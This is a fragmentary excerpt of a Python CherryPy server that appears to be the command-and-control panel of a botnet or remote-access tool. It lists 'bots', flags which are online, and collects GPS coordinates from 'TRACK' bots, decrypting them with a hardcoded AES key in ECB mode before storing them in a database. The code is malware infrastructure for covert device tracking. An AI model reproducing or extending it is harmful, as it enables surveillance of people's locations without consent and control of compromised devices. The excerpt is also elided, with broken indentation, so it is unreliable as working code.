...
def error_page(status, message, traceback, version):
    with open("web/Error.html", "r") as f:
        html = f.read()
...
class Main(object):
    ...
    @require_admin
    def index(self):
        with open("web/Menu.html", "r") as f:
            html = f.read()
            return html
    ...
    @require_admin
    def downloads(self):
        with open("web/Download.html", "r") as f:
            html = f.read()
            return html
    ...
    def login(self, password=''):
        ...
        if not admin_password:
            if password:
                ...
                with open("web/CreatePassword.html", "r") as f:
                    html = f.read()
                    return html
        else:
            password_hash = hashlib.sha256()
    ...
    def disconnect(self):
        ...
        with open("web/Disconnect.html", "r") as f:
            html = f.read()
            return html
...
class CNC(object):
	...
	output_gps = ""
        ...
        for bot in bot_list:
		#TRACK
		#todo a href = gps   def gps   web/Gps.html
		if "TRACK" in bot[0]:
			output_gps += '<tr><td><a href="bot?botid=%s">%s</a></td><td>%s</td><td>%s</td><td>%s</td><td><input type="checkbox" id="%s" class="gps" onclick="refresh_map()" checked /></td></tr>' % (bot[0], bot[0], "Online" if time.time() - 30 < bot[1] else time.ctime(bot[1]), bot[2], bot[3], bot[0])	
		else:
			output_bot += '<tr><td><a href="bot?botid=%s">%s</a></td><td>%s</td><td>%s</td><td>%s</td><td><input type="checkbox" id="%s" class="bot" /></td></tr>' % (bot[0], bot[0], "Online" if time.time() - 30 < bot[1] else time.ctime(bot[1]), bot[2], bot[3], bot[0])
        with open("web/List.html", "r") as f:
           	html = f.read()
            	html = html.replace("{{bot_table}}", output_bot)
	    	html = html.replace("{{gps_table}}", output_gps)
            	return html
...
class API(object):
	...
	if not botid.startswith("AGENT"):
		obj = AES.new("ChifFr3Mm3NTmDrR", AES.MODE_ECB, "This is an IV456")
		botid = obj.decrypt(unhexlify(botid))
		botid = ''.join(char for char in botid if char in printable)
		print repr(botid)
		if not botid.startswith("TRACK"):
			raise cherrypy.HTTPError(403)
        if not validate_botid(botid):
           raise cherrypy.HTTPError(403)
	...
	if not botid.startswith("AGENT"):
		obj = AES.new("ChifFr3Mm3NTmDrR", AES.MODE_ECB, "This is an IV456")
		botid = obj.decrypt(unhexlify(html_escape(botid)))
		botid = ''.join(char for char in botid if char in printable)
		#print repr(botid)
		if not botid.startswith("TRACK"):
			raise cherrypy.HTTPError(403)
	...
	if "TRACK" in botid:
		...
		buffer = html_escape(output)
		#print buffer
		buffer = buffer.split(",")
		buffer[2]=buffer[2].replace("/","-")
		buffer[2]=buffer[2]+" "+buffer[3]
		
		#Dechiffrement des coordonnees GPS
		obj = AES.new("ChifFr3Mm3NTmDrR", AES.MODE_ECB, "This is an IV456")
		buffer[0] = obj.decrypt(unhexlify(html_escape(buffer[0])))
		buffer[0] = ''.join(char for char in buffer[0] if char in printable)
		print repr(buffer[0])

		buffer[1] = obj.decrypt(unhexlify(html_escape(buffer[1])))
		buffer[1] = ''.join(char for char in buffer[1] if char in printable)
		print repr(buffer[1])

		#buffer[0] = longitude  buffer[1] = latitude  buffer[2] = date_gps
		exec_DB("INSERT INTO gps VALUES (?, ?, ?, ?, ?, ?)", (None, time.time(), buffer[0], buffer[1], buffer[2], html_escape(botid)))
	else:
	...
	#TRACK
	if "TRACK" in botid:
		bot_output = query_DB('SELECT * FROM gps WHERE bot=? ORDER BY date DESC', (botid,))
		for entry in reversed(bot_output):
			#time, lat, lng
			output += "%s/%s/%s/%s\n" % (entry[5],entry[4],entry[3],entry[2])
	else:
